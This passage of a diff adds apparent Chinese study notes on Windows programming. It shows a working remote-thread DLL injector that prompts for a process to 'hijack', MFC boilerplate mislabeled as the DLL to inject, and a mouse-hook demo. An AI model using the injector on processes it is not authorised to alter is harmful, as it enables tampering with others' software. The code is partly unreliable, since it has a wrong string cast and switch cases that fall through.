+    case DLL_THREAD_DETACH:
+        break;
+    case DLL_PROCESS_DETACH:
+        break;
+    }
+    return TRUE;
+}
+</code></pre>
+<h4>DLL注入</h4>
+<p><strong>注入器</strong></p>
+<pre><code class="language-cpp">#include &lt;iostream&gt;
+#include &lt;windows.h&gt;
+#include &lt;string&gt;
+#include &lt;cstring&gt;
+
+const int MaxLen = 0x50;
+using namespace std;
+
+int main()
+{
+    char DllPath[MaxLen];
+    DWORD PID;
+    cout &lt;&lt; &quot;Which DLL To Load?\n&quot;;
+    cin &gt;&gt; DllPath;
+    if (DllPath == NULL)
+        cout &lt;&lt; &quot;This Dll Not exsits\n&quot;;
+    cout &lt;&lt; DllPath &lt;&lt; endl;
+    //LoadLibraryA((LPCSTR)DllPath);
+
+    cout &lt;&lt; &quot;Which Program want to hijack?\n&quot;;
+    cin &gt;&gt; PID;
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS,FALSE,PID);
+    if (hProcess == NULL)
+    {
+        cout &lt;&lt; &quot;This process is missing\n&quot;;
+        exit(-1);
+    }
+    int DllLen = strlen(DllPath) + sizeof(char);
+
+    PVOID pDllAddr = VirtualAllocEx(
+        hProcess,NULL,DllLen,MEM_COMMIT,PAGE_READWRITE
+    );
+    if (pDllAddr == NULL)
+    {
+        CloseHandle(hProcess);
+        cout &lt;&lt; &quot;Handle ERROR\n&quot;;
+        exit(-1);
+    }
+    DWORD dwWriteNum = 0;
+    cout &lt;&lt; &quot;Writting Mem\n&quot;;
+    WriteProcessMemory(
+        hProcess, pDllAddr, DllPath, DllLen, &amp;dwWriteNum
+    );
+
+    cout &lt;&lt; &quot;GetProcAddr\n&quot;;
+    FARPROC pFunAddr = GetProcAddress(
+        GetModuleHandle((LPCWSTR)&quot;kernel32.dll&quot;), &quot;LoadLibraryA&quot;
+    );
+
+    cout &lt;&lt; &quot;CreateRemoteThread\n&quot;;
+    HANDLE hThread = CreateRemoteThread(
+        hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pFunAddr, pDllAddr, 0, NULL
+    );
+    cout &lt;&lt; &quot;Close Handles\n&quot;;
+    WaitForSingleObject(hThread,INFINITE);
+    CloseHandle(hThread);
+    CloseHandle(hProcess);
+
+}
+</code></pre>
+<p><strong>待注入DLL</strong></p>
+<pre><code class="language-cpp">
+// Injector.cpp: 定义应用程序的类行为。
+//
+
+#include &quot;pch.h&quot;
+#include &quot;framework.h&quot;
+#include &quot;Injector.h&quot;
+#include &quot;InjectorDlg.h&quot;
+
+#ifdef _DEBUG
+#define new DEBUG_NEW
+#endif
+
+
+// CInjectorApp
+
+BEGIN_MESSAGE_MAP(CInjectorApp, CWinApp)
+	ON_COMMAND(ID_HELP, &amp;CWinApp::OnHelp)
+END_MESSAGE_MAP()
+
+
+// CInjectorApp 构造
+
+CInjectorApp::CInjectorApp()
+{
+	// 支持重新启动管理器
+	m_dwRestartManagerSupportFlags = AFX_RESTART_MANAGER_SUPPORT_RESTART;
+
+	// TODO: 在此处添加构造代码，
+	// 将所有重要的初始化放置在 InitInstance 中
+}
+
+
+// 唯一的 CInjectorApp 对象
+
+CInjectorApp theApp;
+
+
+// CInjectorApp 初始化
+
+BOOL CInjectorApp::InitInstance()
+{
+	// 如果一个运行在 Windows XP 上的应用程序清单指定要
+	// 使用 ComCtl32.dll 版本 6 或更高版本来启用可视化方式，
+	//则需要 InitCommonControlsEx()。  否则，将无法创建窗口。
+	INITCOMMONCONTROLSEX InitCtrls;
+	InitCtrls.dwSize = sizeof(InitCtrls);
+	// 将它设置为包括所有要在应用程序中使用的
+	// 公共控件类。
+	InitCtrls.dwICC = ICC_WIN95_CLASSES;
+	InitCommonControlsEx(&amp;InitCtrls);
+
+	CWinApp::InitInstance();
+
+
+	AfxEnableControlContainer();
+
+	// 创建 shell 管理器，以防对话框包含
+	// 任何 shell 树视图控件或 shell 列表视图控件。
+	CShellManager *pShellManager = new CShellManager;
+
+	// 激活“Windows Native”视觉管理器，以便在 MFC 控件中启用主题
+	CMFCVisualManager::SetDefaultManager(RUNTIME_CLASS(CMFCVisualManagerWindows));
+
+	// 标准初始化
+	// 如果未使用这些功能并希望减小
+	// 最终可执行文件的大小，则应移除下列
+	// 不需要的特定初始化例程
+	// 更改用于存储设置的注册表项
+	// TODO: 应适当修改该字符串，
+	// 例如修改为公司或组织名
+	SetRegistryKey(_T(&quot;应用程序向导生成的本地应用程序&quot;));
+
+	CInjectorDlg dlg;
+	m_pMainWnd = &amp;dlg;
+	INT_PTR nResponse = dlg.DoModal();
+	if (nResponse == IDOK)
+	{
+		// TODO: 在此放置处理何时用
+		//  “确定”来关闭对话框的代码
+	}
+	else if (nResponse == IDCANCEL)
+	{
+		// TODO: 在此放置处理何时用
+		//  “取消”来关闭对话框的代码
+	}
+	else if (nResponse == -1)
+	{
+		TRACE(traceAppMsg, 0, &quot;警告: 对话框创建失败，应用程序将意外终止。\n&quot;);
+		TRACE(traceAppMsg, 0, &quot;警告: 如果您在对话框上使用 MFC 控件，则无法 #define _AFX_NO_MFC_CONTROLS_IN_DIALOGS。\n&quot;);
+	}
+
+	// 删除上面创建的 shell 管理器。
+	if (pShellManager != nullptr)
+	{
+		delete pShellManager;
+	}
+
+#if !defined(_AFXDLL) &amp;&amp; !defined(_AFX_NO_MFC_CONTROLS_IN_DIALOGS)
+	ControlBarCleanUp();
+#endif
+
+	// 由于对话框已关闭，所以将返回 FALSE 以便退出应用程序，
+	//  而不是启动应用程序的消息泵。
+	return FALSE;
+}
+</code></pre>
+<h2>Hook编程（进程Hook）</h2>
+<pre><code class="language-cpp">#include &lt;windows.h&gt;
+
+
+
+
+LRESULT CALLBACK WindowProc(
+	//CALLBACK 从右向左入栈
+	//LRESULT long
+	//该函数处理窗口消息
+
+	HWND hWnd,//窗口句柄类型
+	UINT uMsg,//unsigned int, 消息
+	WPARAM wParam,//unsigned int 
+	LPARAM lParam //long int
+
+);
+
+HHOOK MouseHook;
+//鼠标钩子处理函数
+LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam);
+
+
+int WINAPI WinMain(				//窗口应用GUI
+	HINSTANCE hInstance,		//当前程序的实例句柄
+								//HINSTANCE ：实例句柄类型
+
+	HINSTANCE hPreInstance,		//为了兼容16位应用程序，永远为空
+
+	LPSTR lpCmdLine,			//命令行参数
+								//LPSTR：char *
+
+	int nCmdShow				//窗口的显示方式
+)
+{
+
+	//1.做一个窗口
+	//1.1设计窗口类 Spy++
+	TCHAR szAppClassName[] = TEXT(&quot;Joe1sn&quot;);//自动适应字符集
+	WNDCLASS wndClass = { 0 };
+	wndClass.hbrBackground = (HBRUSH)GetStockObject(WHITE_BRUSH);//加载白色画刷
+	wndClass.hCursor = LoadCursor(NULL, IDC_ARROW);//加载光标
+	wndClass.hInstance = hInstance;//当前窗口实例句柄
+	wndClass.lpfnWndProc = WindowProc;//窗口处理函数
+	wndClass.lpszClassName = szAppClassName;//窗口类型
+	wndClass.style = CS_HREDRAW | CS_VREDRAW; //窗口类的风格
+
+	//1.2注册窗口类
+	RegisterClass(&amp;wndClass);
+
+	//1.3创建窗口类
+	HWND hWnd = CreateWindow(szAppClassName,
+		TEXT(&quot;Test&quot;),
+		WS_BORDER | WS_CAPTION | WS_SYSMENU | WS_MAXIMIZEBOX | WS_MINIMIZEBOX,
+		500, 200, 800, 600,
+		NULL, NULL, hInstance, NULL
+	);
+	
+	//1.4显示和更新窗口
+	ShowWindow(hWnd,SW_SHOW);//显示
+	UpdateWindow(hWnd);//更新窗口
+
+	//1.5消息循环
+	//（参考QT的信号和槽?）
+	//应用程序-&gt;操作系统-&gt;消息队列-&gt;应用程序
+	MSG msg;
+	while (GetMessage(&amp;msg,NULL,0,0))//所有消息都要获取
+									 //WM_QIT，返回0，结束循环
+	{
+		//将虚拟键消息转为字符消息
+		//windows只能识别虚拟键值 VK_UP VK_DOWN
+		TranslateMessage(&amp;msg);
+
+		//将消息分发给窗口处理函数
+		//这里是WinProc
+		DispatchMessage(&amp;msg);
+	}
+
+
+
+	return 0;
+}
+
+//鼠标钩子处理函数
+LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam)
+{
+	//int x = LOWORD(lParam);
+	//int y = HIWORD(lParam);
+
+	//x += 100;
+	//lParam = MAKELONG(x,y);
+
+	/*if (wParam == VK_F2)
+	{
+		SendMessage(hWnd, WM_CLOSE, 0, 0);
+		UnhookWindowsHookW(MouseHook);
+	}*/
+
+	return CallNextHookEx(MouseHook,nCode,wParam,lParam);//向下传递
+	//return 1;//返回非0，表示消息已被处理，这样系统就不会把这个消息传递给程序
+}
+
+LRESULT CALLBACK WindowProc(HWND hWnd,UINT uMsg,WPARAM wParam,LPARAM lParam)
+{
+	PAINTSTRUCT ps;//
+	HDC hDC;//绘图DC
+
+	switch (uMsg)
+	{
+		//进程类hook
+	case WM_CREATE://窗口创建消息
+	{
+		//安装hook
+		MouseHook = SetWindowsHookEx(WH_MOUSE, MouseProc, NULL, GetCurrentThreadId());
+		break;
+	}
+	case WM_CLOSE://窗口关闭消息
+		DestroyWindow(hWnd);
+		break;
+	case WM_DESTROY://窗口销毁消息
+		PostQuitMessage(0);//发送WM_QUIT就会退出
+	case WM_PAINT://窗口绘图消息
+	{
+		hDC = BeginPaint(hWnd, &amp;ps);
+		HPEN hPen = CreatePen(PS_SOLID, 5, RGB(255, 0, 0));
+		SelectObject(hDC, hPen);
+
+		Ellipse(hDC, 0, 0, 200, 200);
+
+		EndPaint(hWnd, &amp;ps);
+	}
+	case WM_LBUTTONDOWN://鼠标左键点击消息
+	{
+		MessageBox(hWnd, TEXT(&quot;Left&quot;), TEXT(&quot;Titile&quot;), MB_OK);
+		break;
+	}
+	case WM_RBUTTONDOWN://鼠标右键点击消息
+	{
+		MessageBox(hWnd, TEXT(&quot;Right&quot;), TEXT(&quot;Titile&quot;), MB_OK);
+		break;
+	}
+	case WM_MOUSEMOVE:
+	{
+		int x = LOWORD(lParam);
+		int y = HIWORD(lParam);
+		wchar_t str[0x100];
+		wsprintf(str, L&quot;当前鼠标坐标(%d , %d)&quot;,x,y);
+		//SetWindowText(hWnd, TEXT(&quot;In&quot;));
+		SetWindowText(hWnd, str);
+	}
+
+	}
+	return DefWindowProc(hWnd, uMsg, wParam, lParam);
+}
+</code></pre>
+
+</div>
+</div></body>
